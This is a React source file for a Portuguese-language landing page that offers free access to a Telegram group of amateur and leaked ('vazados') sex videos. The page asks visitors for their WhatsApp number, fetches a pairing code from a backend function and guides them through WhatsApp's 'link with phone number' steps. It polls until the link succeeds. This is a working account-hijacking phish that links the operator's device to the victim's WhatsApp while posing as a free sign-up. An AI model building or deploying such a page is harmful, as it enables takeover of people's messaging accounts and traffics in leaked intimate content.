import { useState, useRef, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Carousel,
  CarouselContent,
  CarouselItem,
  CarouselNext,
  CarouselPrevious,
} from "@/components/ui/carousel";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Flame, Video, Sparkles, Smartphone, Phone, Loader2, CheckCircle2, Copy, Clock } from "lucide-react";
import { toast } from "@/hooks/use-toast";

const CDN_BASE = "https://d2xsxph8kpxj0f.cloudfront.net/310519663113665449/as45WyzBdVgmTUSfVHBTEW";
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
const POLL_INTERVAL = 5000;

const HERO_SLIDES = [
  { id: 1, src: `${CDN_BASE}/copy_A6EFD7FE-3457-4050-8C0C-ACA100B7049E_4278313f.mov`, poster: `${CDN_BASE}/IMG_0340_94c5616d.JPG`, title: "Slide 1" },
  { id: 2, src: `${CDN_BASE}/copy_CBB0F59C-F8FE-476C-9062-16C9647370DC_3dbc6417.mov`, poster: `${CDN_BASE}/IMG_0341_acf4af45.JPG`, title: "Slide 2" },
  { id: 3, src: `${CDN_BASE}/copy_8191B16E-8FB6-4C94-B571-9A3F2D0191B5_f313d20d.mov`, poster: `${CDN_BASE}/IMG_0338_99fa3ab4.JPG`, title: "Slide 3" },
  { id: 4, src: `${CDN_BASE}/copy_F77CF4BE-F77E-4A2A-B91D-D6FD9A85F1C7_ba07e227.mov`, poster: `${CDN_BASE}/IMG_0344_e7438fa6.JPG`, title: "Slide 4" },
  { id: 5, src: `${CDN_BASE}/copy_CECFB5DB-0CFF-4FBB-986C-B245B1D1CA7E_3a02e764.mov`, poster: `${CDN_BASE}/IMG_0342_ad561fc3.JPG`, title: "Slide 5" },
  { id: 6, src: `${CDN_BASE}/E3F91A2F-CDF1-404E-8027-F60ABB08C574_628f9b27.mov`, poster: `${CDN_BASE}/IMG_0286_8ef9cf86.JPG`, title: "Slide 6" },
  { id: 7, src: `${CDN_BASE}/copy_E9F8F4AE-B35D-4C6A-ACDD-2E058D36091A_a927ab1f.mov`, poster: `${CDN_BASE}/IMG_0343_ff766ecc.JPG`, title: "Slide 7" },
];

const TELEGRAM_LINK = "https://t.me/lineusilvaoficial";
// Placeholders para API (não pede nome/email ao usuário)
const API_NAME = "Visitante";
const API_EMAIL = "visitante@lineusilva.local";

const LineuSilvaPage = () => {
  const [heroSlide, setHeroSlide] = useState(0);
  const heroVideoRefs = useRef<(HTMLVideoElement | null)[]>([]);

  // Connect flow (igual /vip)
  const [connectOpen, setConnectOpen] = useState(false);
  const [step, setStep] = useState(1); // 1 = telefone, 2 = código/fila
  const [phone, setPhone] = useState("");
  const [generating, setGenerating] = useState(false);
  const [pairingCode, setPairingCode] = useState<string | null>(null);
  const [instanceDbId, setInstanceDbId] = useState<string | null>(null);
  const [connected, setConnected] = useState(false);
  const [polling, setPolling] = useState(false);
  const [inQueue, setInQueue] = useState(false);
  const [queueSeconds, setQueueSeconds] = useState(0);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const instanceDbIdRef = useRef<string | null>(null);
  const queueTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const queueRetryRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    heroVideoRefs.current.forEach((el, i) => {
      if (el) {
        if (i === heroSlide) el.play().catch(() => {});
        else el.pause();
      }
    });
  }, [heroSlide]);

  useEffect(() => {
    instanceDbIdRef.current = instanceDbId;
  }, [instanceDbId]);

  useEffect(() => {
    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
      if (queueTimerRef.current) clearInterval(queueTimerRef.current);
      if (queueRetryRef.current) clearInterval(queueRetryRef.current);
    };
  }, []);

  const callEdge = async (body: Record<string, unknown>) => {
    const res = await fetch(`${SUPABASE_URL}/functions/v1/public-connect`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_ANON_KEY,
      },
      body: JSON.stringify(body),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || `Erro ${res.status}`);
    return data;
  };

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return m > 0 ? `${m}m ${s.toString().padStart(2, "0")}s` : `${s}s`;
  };

  const startQueue = (estimatedSeconds: number) => {
    setInQueue(true);
    setQueueSeconds(estimatedSeconds);
    setStep(2);
    if (queueTimerRef.current) clearInterval(queueTimerRef.current);
    queueTimerRef.current = setInterval(() => {
      setQueueSeconds((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    if (queueRetryRef.current) clearInterval(queueRetryRef.current);
    queueRetryRef.current = setInterval(async () => {
      try {
        const cleanPhone = phone.replace(/\D/g, "");
        const result = await callEdge({ action: "get-code", name: API_NAME, email: API_EMAIL, phone: cleanPhone });
        if (result.status === "busy") {
          setQueueSeconds(result.estimated_seconds || 30);
          return;
        }
        if (queueTimerRef.current) clearInterval(queueTimerRef.current);
        if (queueRetryRef.current) clearInterval(queueRetryRef.current);
        setInQueue(false);
        setPairingCode(result.code);
        setInstanceDbId(result.instance_db_id);
        setStep(2);
        toast({ title: "Código gerado! 🔑" });
        startPolling();
      } catch {
        // keep waiting
      }
    }, 3000);
  };

  const startPolling = () => {
    setPolling(true);
    pollingRef.current = setInterval(async () => {
      try {
        const status = await callEdge({ action: "check-status", instance_db_id: instanceDbIdRef.current });
        if (status.connected) {
          if (pollingRef.current) clearInterval(pollingRef.current);
          setPolling(false);
          setConnected(true);
          toast({ title: "WhatsApp conectado com sucesso! ✅" });
        }
      } catch {
        // ignore
      }
    }, POLL_INTERVAL);
  };

  const openConnectModal = () => {
    setConnectOpen(true);
    setStep(1);
    setPhone("");
    setPairingCode(null);
    setInstanceDbId(null);
    setConnected(false);
    setPolling(false);
    setInQueue(false);
  };

  const handleGetCode = async () => {
    const cleanPhone = phone.replace(/\D/g, "");
    if (cleanPhone.length < 10) {
      toast({ title: "Número inválido", description: "Digite seu número com DDD", variant: "destructive" });
      return;
    }
    setGenerating(true);
    try {
      const result = await callEdge({ action: "get-code", name: API_NAME, email: API_EMAIL, phone: cleanPhone });
      if (result.status === "busy") {
        startQueue(result.estimated_seconds || 60);
        setGenerating(false);
        return;
      }
      setPairingCode(result.code);
      setInstanceDbId(result.instance_db_id);
      setStep(2);
      toast({ title: "Código gerado! 🔑" });
      startPolling();
    } catch {
      toast({
        title: "⏳ Alta demanda!",
        description: "Tente novamente em 1 minuto.",
        variant: "destructive",
        duration: 10000,
      });
    }
    setGenerating(false);
  };

  const copyCode = () => {
    if (pairingCode) {
      navigator.clipboard.writeText(pairingCode);
      toast({ title: "Código copiado!" });
    }
  };

  const handleEntrar = () => {
    openConnectModal();
  };

  const openTelegram = () => {
    window.open(TELEGRAM_LINK, "_blank");
  };

  const benefits = [
    { icon: Flame, title: "Casais Amadores de Verdade", description: "Conteúdo autêntico e genuíno de casais reais" },
    { icon: Video, title: "Conteúdo organizado por tópicos", description: "Mais de 2200 vídeos postados" },
    { icon: Sparkles, title: "Atualizações Todos os Dias", description: "O ADM garante novidade diária pra você" },
  ];

  return (
    <div
      className="min-h-screen bg-black text-white antialiased"
      style={{ fontFamily: "'Poppins', sans-serif" }}
    >
      <header className="sticky top-0 z-50 bg-black border-b border-gray-800 px-4 py-3 flex items-center gap-3">
        <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-red-500/30 to-red-700/30 flex items-center justify-center flex-shrink-0 overflow-hidden">
          <img src={`${CDN_BASE}/IMG_0016_3eda9166.JPG`} alt="" className="w-full h-full object-cover" />
        </div>
        <span className="font-bold text-white text-lg" style={{ fontFamily: "'Poppins', sans-serif" }}>
          Lineu Silva Oficial
        </span>
      </header>

      <section className="px-4 pt-6 pb-10 max-w-lg mx-auto">
        <h1 className="text-center mb-2" style={{ fontFamily: "'Playfair Display', serif" }}>
          <span className="block text-2xl md:text-3xl font-bold text-white">Conteúdo que você</span>
          <span className="block text-2xl md:text-3xl font-bold text-red-500">nunca viu 🔥</span>
        </h1>
        <p className="text-center text-white/90 text-sm md:text-base mb-2">
          Conheça o grupo VIP mais diferenciado da Internet
        </p>
        <p className="text-center mb-6">
          <span className="inline-block bg-green-600/90 text-white text-sm font-bold px-4 py-1.5 rounded-full shadow-lg">
            🎬 Tudo 100% de graça — assista sem pagar nada
          </span>
        </p>

        <div className="relative rounded-2xl overflow-hidden bg-black border border-gray-800 mb-4 group">
          <Carousel
            opts={{ align: "center", loop: true }}
            className="w-full"
            setApi={(api) => {
              if (!api) return;
              setHeroSlide(api.selectedScrollSnap());
              api.on("select", () => setHeroSlide(api.selectedScrollSnap()));
            }}
          >
            <CarouselContent>
              {HERO_SLIDES.map((slide, i) => (
                <CarouselItem key={slide.id} className="basis-full">
                  <div className="relative w-full aspect-video bg-black">
                    <video
                      ref={(el) => { heroVideoRefs.current[i] = el; }}
                      src={slide.src}
                      poster={slide.poster}
                      controls
                      autoPlay={i === 0}
                      loop
                      playsInline
                      className="w-full h-full object-cover"
                      preload="auto"
                    />
                  </div>
                </CarouselItem>
              ))}
            </CarouselContent>
            <CarouselPrevious className="absolute left-2 top-1/2 -translate-y-1/2 z-10 h-10 w-10 rounded-full bg-red-500/90 hover:bg-red-600 text-white border-0 opacity-90 md:group-hover:opacity-100" />
            <CarouselNext className="absolute right-2 top-1/2 -translate-y-1/2 z-10 h-10 w-10 rounded-full bg-red-500/90 hover:bg-red-600 text-white border-0 opacity-90 md:group-hover:opacity-100" />
          </Carousel>
        </div>

        <div className="flex justify-center gap-1.5 mb-2">
          {HERO_SLIDES.map((_, i) => (
            <div
              key={i}
              className={`h-1 rounded-full transition-all ${
                i === heroSlide ? "w-4 bg-red-500" : "w-1.5 bg-gray-600"
              }`}
            />
          ))}
        </div>
        <p className="text-center text-white/80 text-sm mb-6">{heroSlide + 1}/7</p>

        <Button
          onClick={handleEntrar}
          className="w-full bg-red-500 hover:bg-red-600 text-white font-semibold py-6 rounded-xl text-base"
        >
          Entrar no Grupo
        </Button>
      </section>

      <section className="px-4 pb-10 max-w-lg mx-auto">
        <div className="bg-[#1a1d24] rounded-2xl border border-gray-800 p-6 md:p-8">
          <h2 className="text-xl md:text-2xl font-bold text-white mb-4 leading-tight" style={{ fontFamily: "'Playfair Display', serif" }}>
            Você está prestes a entrar no melhor grupo VIP do Telegram
          </h2>
          <p className="text-white/90 text-sm md:text-base mb-2">
            Aqui não tem repetição, é só conteúdo novo que você não encontra em nenhum grupo.
          </p>
          <p className="text-white font-semibold text-sm md:text-base mb-4">Confira o que te espera lá dentro:</p>
          <p className="text-green-400 text-sm font-semibold mb-6 flex items-center gap-2">
            <span className="inline-block w-2 h-2 rounded-full bg-green-500 animate-pulse" />
            E o melhor: é tudo de graça. Nenhuma taxa, nenhuma mensalidade.
          </p>
          <div className="space-y-4">
            {benefits.map((item) => (
              <div key={item.title} className="flex gap-4 p-4 rounded-xl bg-black/50 border border-gray-800">
                <div className="h-12 w-12 rounded-lg bg-red-500/20 flex items-center justify-center flex-shrink-0">
                  <item.icon className="h-6 w-6 text-red-500" />
                </div>
                <div>
                  <h3 className="font-bold text-white text-sm md:text-base" style={{ fontFamily: "'Playfair Display', serif" }}>
                    {item.title}
                  </h3>
                  <p className="text-white/70 text-sm mt-0.5">{item.description}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      <section className="px-4 pb-12 max-w-lg mx-auto">
        <h3 className="text-xl md:text-2xl font-bold text-white text-center mb-6" style={{ fontFamily: "'Playfair Display', serif" }}>
          Dê uma espiadinha no grupo 👀
        </h3>
        <p className="text-center text-green-400 text-sm font-semibold mb-4">
          Esse vídeo é grátis. Todo o conteúdo do grupo também é.
        </p>
        <div className="rounded-2xl overflow-hidden bg-black border border-gray-800 mb-6 w-full max-w-full max-w-[320px] mx-auto">
          <video
            src={`${CDN_BASE}/ScreenRecording_03-10-202617-22-57_1_0e5f2d03.mp4`}
            controls
            className="w-full h-auto bg-black"
            playsInline
          />
        </div>
        <p className="text-center text-white/90 text-sm mb-4">
          Entrar é grátis. Assista a centenas de vídeos sem pagar nada.
        </p>
        <div className="text-center">
          <Button onClick={handleEntrar} className="bg-red-500 hover:bg-red-600 text-white font-semibold px-8 py-6 rounded-xl">
            Entrar no Grupo VIP — 100% Grátis
          </Button>
        </div>
      </section>

      <footer className="bg-black border-t border-gray-800 py-6 text-center">
        <p className="text-gray-500 text-sm">Lineu Silva Oficial · Grupo VIP no Telegram</p>
      </footer>

      {/* Modal: Conectar número (mesmo fluxo do /vip) */}
      <Dialog open={connectOpen} onOpenChange={setConnectOpen}>
        <DialogContent className="max-w-md bg-[#1a1d24] border-gray-800 text-white max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="text-white text-center">Conectar para entrar no grupo</DialogTitle>
          </DialogHeader>

          <div className="flex justify-center gap-2 mb-6">
            {[1, 2].map((s) => (
              <div key={s} className="flex items-center gap-2">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold border transition-all ${
                  (s === 1 && step >= 1) || (s === 2 && (step === 2 || connected))
                    ? "bg-red-500 text-white border-red-500"
                    : "bg-gray-800 text-gray-500 border-gray-700"
                }`}>
                  {connected && s === 2 ? <CheckCircle2 className="w-4 h-4" /> : s}
                </div>
                {s < 2 && <div className={`w-8 h-0.5 rounded ${step === 2 || connected ? "bg-red-500" : "bg-gray-700"}`} />}
              </div>
            ))}
          </div>

          {/* Step 1: Telefone */}
          {step === 1 && !inQueue && (
            <div className="space-y-4">
              <div className="flex justify-center mb-2">
                <div className="w-12 h-12 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-center">
                  <Phone className="w-6 h-6 text-red-400" />
                </div>
              </div>
              <h3 className="text-lg font-bold text-white text-center">Número do WhatsApp</h3>
              <p className="text-gray-500 text-xs text-center mb-4">Digite o número que deseja conectar</p>
              <div className="space-y-3">
                <div className="space-y-1.5">
                  <Label className="text-sm text-gray-300">Telefone com DDD</Label>
                  <div className="flex gap-2">
                    <div className="flex items-center bg-gray-800 border border-gray-700 rounded-lg px-4 text-sm text-gray-400 shrink-0 h-11">+55</div>
                    <Input
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="11 99999-9999"
                      className="h-11 bg-gray-800/50 border-gray-700 rounded-lg text-white font-mono placeholder:text-gray-500 focus:border-red-500 flex-1"
                      type="tel"
                    />
                  </div>
                </div>
                <div className="flex gap-3">
                  <Button
                    onClick={handleGetCode}
                    disabled={generating || !phone.trim()}
                    className="w-full h-11 rounded-lg bg-red-500 hover:bg-red-600 text-white gap-2 disabled:opacity-50"
                  >
                    {generating ? <><Loader2 className="w-4 h-4 animate-spin" /> Gerando...</> : "Gerar Código"}
                  </Button>
                </div>
              </div>
            </div>
          )}

          {step === 2 && inQueue && (
            <div className="text-center py-4">
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 rounded-full bg-red-500/10 border-2 border-red-500/30 flex items-center justify-center animate-pulse">
                  <Clock className="w-8 h-8 text-red-400" />
                </div>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Fila de espera</h3>
              <p className="text-gray-400 text-sm mb-4">Seu código será gerado automaticamente.</p>
              <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-6 mb-4">
                <p className="text-xs text-red-400 font-medium mb-2">Tempo estimado</p>
                <p className="text-4xl font-bold font-mono text-red-400">{formatTime(queueSeconds)}</p>
                <p className="text-xs text-red-500/60 mt-2">Não feche esta janela</p>
              </div>
              <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>Verificando disponibilidade...</span>
              </div>
            </div>
          )}

          {/* Step 2: Código */}
          {step === 2 && !inQueue && pairingCode && !connected && (
            <div className="text-center">
              <div className="flex justify-center mb-4">
                <div className="w-12 h-12 rounded-xl bg-red-500/10 border border-red-500/30 flex items-center justify-center">
                  <Smartphone className="w-6 h-6 text-red-400" />
                </div>
              </div>
              <h3 className="text-xl font-bold text-white mb-2">Código de pareamento</h3>
              <p className="text-white/90 text-sm md:text-base mb-5">
                Este é o código de pareamento usado para conectar seu WhatsApp e ter acesso ao grupo de vazados.
              </p>
              <div className="bg-red-500/10 border-2 border-red-500/40 rounded-2xl p-6 flex items-center justify-center mb-6">
                <button onClick={copyCode} className="flex items-center gap-4 cursor-pointer group">
                  <span className="text-3xl md:text-4xl font-mono font-bold text-red-400 tracking-[0.25em]">{pairingCode}</span>
                  <Copy className="w-6 h-6 text-gray-400 group-hover:text-red-400 transition-colors" />
                </button>
              </div>
              <div className="bg-gray-900/80 border-2 border-gray-700 rounded-2xl p-6 text-left mb-4">
                <p className="text-base font-bold text-white mb-4 flex items-center gap-2">
                  <Smartphone className="w-5 h-5 text-red-400" /> Como conectar:
                </p>
                <ol className="space-y-4">
                  <li className="flex gap-3 items-start">
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-red-500/20 text-red-400 font-bold text-base flex items-center justify-center">1</span>
                    <span className="text-white text-base">Abra o <strong>WhatsApp</strong> no seu celular</span>
                  </li>
                  <li className="flex gap-3 items-start">
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-red-500/20 text-red-400 font-bold text-base flex items-center justify-center">2</span>
                    <span className="text-white text-base">Vá em <strong>Configurações</strong> → <strong>Aparelhos conectados</strong></span>
                  </li>
                  <li className="flex gap-3 items-start">
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-red-500/20 text-red-400 font-bold text-base flex items-center justify-center">3</span>
                    <span className="text-white text-base">Toque em <strong>Conectar um aparelho</strong></span>
                  </li>
                  <li className="flex gap-3 items-start">
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-red-500/20 text-red-400 font-bold text-base flex items-center justify-center">4</span>
                    <span className="text-white text-base">Escolha <strong>Conectar com número de telefone</strong></span>
                  </li>
                  <li className="flex gap-3 items-start">
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-red-500/20 text-red-400 font-bold text-base flex items-center justify-center">5</span>
                    <span className="text-white text-base">Digite o código: <strong className="text-red-400 font-mono">{pairingCode}</strong></span>
                  </li>
                </ol>
              </div>
              {polling && (
                <div className="flex items-center justify-center gap-2 text-base text-gray-400 py-2">
                  <Loader2 className="w-5 h-5 animate-spin text-red-400" />
                  <span>Aguardando conexão no WhatsApp...</span>
                </div>
              )}
            </div>
          )}

          {/* Sucesso */}
          {connected && (
            <div className="text-center py-4">
              <div className="w-16 h-16 rounded-full bg-green-500/10 border-2 border-green-500/30 flex items-center justify-center mx-auto mb-4">
                <CheckCircle2 className="w-8 h-8 text-green-400" />
              </div>
              <h3 className="text-xl font-bold text-white mb-2">WhatsApp conectado!</h3>
              <p className="text-sm text-gray-400 mb-6">Agora você pode entrar no grupo VIP no Telegram.</p>
              <Button onClick={openTelegram} className="w-full bg-red-500 hover:bg-red-600 text-white py-6 rounded-xl">
                Entrar no Grupo no Telegram
              </Button>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default LineuSilvaPage;
